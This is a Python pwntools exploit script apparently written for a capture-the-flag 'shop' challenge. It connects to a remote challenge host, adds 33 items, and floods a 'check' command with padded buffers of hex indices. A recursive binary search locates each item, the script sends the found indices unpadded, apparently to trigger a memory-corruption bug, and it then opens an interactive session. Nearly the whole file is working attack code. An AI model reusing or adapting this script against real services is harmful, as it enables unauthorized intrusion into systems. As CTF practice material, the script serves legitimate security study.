#!/usr/bin/python

from pwn import *
import sys
from time import sleep
import re

MAX_MESS = 1024 * 5

def add_item(conn, name, desc, price):
    conn.send("a\n")
    conn.send(name)
    conn.send(desc)
    conn.send(price)
    conn.recvuntil('> ')


def check_item(conn, idx, name):
    conn.send("c\n")
    buf = idx + 'x'
    message = 'z' * (MAX_MESS - len(buf)) + buf
    conn.sendline(message)

    buffer = conn.recvuntil('> ')
    if buffer.count('Buying') !=0 and name in buffer:
        print("Found -> %s <- at address %s" % (name, idx))
        return True
    else:
        return False


def check_range(conn, idx, f=False):
    conn.send("c\n")
    if f == False:
        buf = '!'.join(idx)
    elif f==True:
        buf = ''.join(idx)

    if len(buf) > MAX_MESS and f==False:
        print("buffer bigger than a MAX_MESS")
        print(len(buf))
        sys.exit(0)

    if f==False:
        message = 'z' * (MAX_MESS - len(buf)) + buf
    else:
        message = buf

    if len(buf) > 65540:
        print("BAD RANGE")
        sys.exit(0)

    conn.sendline(message)
    buffer = conn.recvuntil('> ', timeout=3)

    if f == False and False:
        print("****************** BUFFER ***********************")
        print(message)
        print(buffer)
        print("**************** BUFFER END *********************")

    cnt = buffer.count('Buying')
    if cnt == 0:
        return False

    t = list()
    b = buffer.split('Buying ')
    for i in range(1, cnt+1):
        off = b[i].find(' for $')
        t.append(b[i][:off])

    return t


def find_item_in_range(conn, idx, name):
    founder = list()
    rsl = check_range(conn, idx, False)

    if rsl == False or name not in rsl:
        return []

    print("Have item in range")

    left = idx[:len(idx)/2]
    right = idx[len(idx)/2:]

    if len(left) == 1:
        if check_item(conn, left[0], name):
            founder.append(left[0])
    else:
        founder += find_item_in_range(conn, left, name)

    if len(right) == 1:
        if check_item(conn, right[0], name):
            founder.append(right[0])
    else:
        founder += find_item_in_range(conn, right, name)

    return founder


def main():
    conn = None
    try:
        sys.argv[1]
        conn = remote('shop.chal.pwning.xxx', 9916)

    except:
        conn = remote('localhost', 5555)

    if conn is None:
        print("Does not connect :(")
        sys.exit(0)

    print(conn.recvuntil(':'))
    conn.sendline("AAAABBBB")

    all_elem = list()
    for i in range(0, 33):
        print("[+] Add item: %d" % (i))
        name = '%c' % (0x41 + i)
        all_elem.append(name*4)

        name = name * 4 + '\n'
        desc = 'Z' * 50 + '\n'
        add_item(conn, name, desc, '100.00\n'  )

    items = []
    idx = list()

    found_items = 0

    ranges = dict()
    for y in range(0, 64):

        idx = list()
        st = y*1024
        en = (y+1)*1024
        for i in range(st, en):
            idx.append('%04x' % (i))

        fnd = check_range(conn, idx)
        if fnd:
            print("Range %d - %d has %d item(s):" % (st, en, len(fnd)))
            found_items += len(fnd)
            ranges[y-1] = list()
            for f in fnd:
                ranges[y-1].append(f)
                print("  %s" % (f))
                all_elem.remove(f)

            if found_items >= 33:
                break

    print("ALL ELEMENTS WHICH DID NOT FIND:")
    print(all_elem)
    if len(all_elem) != 0:
        print("Bad bad bad")
        conn.interactive()
        sys.exit(0)

    print(ranges)

    conn.recvuntil('> ', timeout=1)

    numbers = list()
    for num in ranges.keys():
        st = num*1024
        en = (num+1)*1024
        for name in ranges[num]:
            print("TRY FIND %s IN RANGE %04x - %04x" % (name,st,en))
            idx = list()
            for i in range(st, en):
                idx.append('%04x' % (i))
            a = find_item_in_range(conn, idx, name)
            print("********************")
            # print(a)
            numbers.append(a[0])

    print(numbers)
    check_range(conn, numbers, True)
    conn.interactive()

if __name__ == '__main__':
    main()
